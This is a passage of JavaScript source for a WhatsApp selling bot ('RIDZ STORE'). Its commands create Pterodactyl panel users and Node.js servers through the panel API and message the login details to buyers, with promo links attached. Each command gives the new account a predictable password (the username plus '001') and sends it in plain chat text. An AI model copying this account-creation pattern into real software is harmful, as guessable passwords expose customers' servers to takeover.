͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
⎙─➣ 𝘐𝘋 : ${user.id}
⎙─➣ 𝘌𝘮𝘢𝘪𝘭 : ${user.email}
⎙─➣ 𝘜𝘴𝘦𝘳𝘯𝘢𝘮𝘦 : ${user.username}
⎙─➣ 𝑃𝑎𝑠𝑠𝑤𝑜𝑟𝑑 : ${password}
⎙─➣𝐿𝑖𝑛𝑘 𝐿𝑜𝑔𝑖𝑛 : ${domain}
⎙─➣ 𝑃𝑒𝑚𝑖𝑙𝑖𝑘 𝑆𝑒𝑟𝑣𝑒𝑟 : RIDZ STORE

𝙏𝙐𝙏𝙊𝙍 𝙍𝙐𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝘼𝙉𝙀𝙇 : https://drive.google.com/file/d/1CL7-jCXy2sZmVeKDAo5FYmr1OjvkUhGZ/view?usp=drivesdk

𝙒𝙀𝘽 𝙊𝙒𝙉𝙀𝙍 : https://lynk.id/tds4youshop 

𝙂𝙍𝙐𝙋 𝙊𝙒𝙉𝙀𝙍 : https://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j
▰▱▰▱▰▱▰▱▰▱▰▱▰▰▱▰▱▰▱▰▱
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "unli": {
    if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "RIDZ STORE"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/5f441449176f49ca93d4a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

*======[ 𝘽𝙀𝙍𝙄𝙆𝙐𝙏 𝘼𝘿𝘼𝙇𝘼𝙃 𝘿𝘼𝙏𝘼 𝙋𝘼𝙉𝙀𝙇 𝘼𝙉𝘿𝘼 ]======*\n

͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
⎙─➣ 𝘐𝘋 : ${user.id}
⎙─➣ 𝘌𝘮𝘢𝘪𝘭 : ${user.email}
⎙─➣ 𝘜𝘴𝘦𝘳𝘯𝘢𝘮𝘦 : ${user.username}
⎙─➣ 𝑃𝑎𝑠𝑠𝑤𝑜𝑟𝑑 : ${password}
⎙─➣𝐿𝑖𝑛𝑘 𝐿𝑜𝑔𝑖𝑛 : ${domain}
⎙─➣ 𝑃𝑒𝑚𝑖𝑙𝑖𝑘 𝑆𝑒𝑟𝑣𝑒𝑟 : RIDZ STORE

𝙏𝙐𝙏𝙊𝙍 𝙍𝙐𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝘼𝙉𝙀𝙇 : https://drive.google.com/file/d/1CL7-jCXy2sZmVeKDAo5FYmr1OjvkUhGZ/view?usp=drivesdk

𝙒𝙀𝘽 𝙊𝙒𝙉𝙀𝙍 : https://lynk.id/tds4youshop 

𝙂𝙍𝙐𝙋 𝙊𝙒𝙉𝙀𝙍 : https://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j
▰▱▰▱▰▱▰▱▰▱▰▱▰▰▱▰▱▰▱▰▱
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "5gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "RIDZ STORE"
let egg = global.eggsnya
let loc = global.location
let memo = "5000"
let cpu = "500"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/5f441449176f49ca93d4a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

*======[ 𝘽𝙀𝙍𝙄𝙆𝙐𝙏 𝘼𝘿𝘼𝙇𝘼𝙃 𝘿𝘼𝙏𝘼 𝙋𝘼𝙉𝙀𝙇 𝘼𝙉𝘿𝘼 ]======*\n

͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
⎙─➣ 𝘐𝘋 : ${user.id}
⎙─➣ 𝘌𝘮𝘢𝘪𝘭 : ${user.email}
⎙─➣ 𝘜𝘴𝘦𝘳𝘯𝘢𝘮𝘦 : ${user.username}
⎙─➣ 𝑃𝑎𝑠𝑠𝑤𝑜𝑟𝑑 : ${password}
⎙─➣𝐿𝑖𝑛𝑘 𝐿𝑜𝑔𝑖𝑛 : ${domain}
⎙─➣ 𝑃𝑒𝑚𝑖𝑙𝑖𝑘 𝑆𝑒𝑟𝑣𝑒𝑟 : RIDZ STORE

𝙏𝙐𝙏𝙊𝙍 𝙍𝙐𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝘼𝙉𝙀𝙇 : https://drive.google.com/file/d/1CL7-jCXy2sZmVeKDAo5FYmr1OjvkUhGZ/view?usp=drivesdk

𝙒𝙀𝘽 𝙊𝙒𝙉𝙀𝙍 : https://lynk.id/tds4youshop 

𝙂𝙍𝙐𝙋 𝙊𝙒𝙉𝙀𝙍 : https://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j
▰▱▰▱▰▱▰▱▰▱▰▱▰▰▱▰▱▰▱▰▱
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "6gb": {
    if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "RIDZ STORE"
let egg = global.eggsnya
let loc = global.location
let memo = "6000"
let cpu = "245"
let disk = "6000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/5f441449176f49ca93d4a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

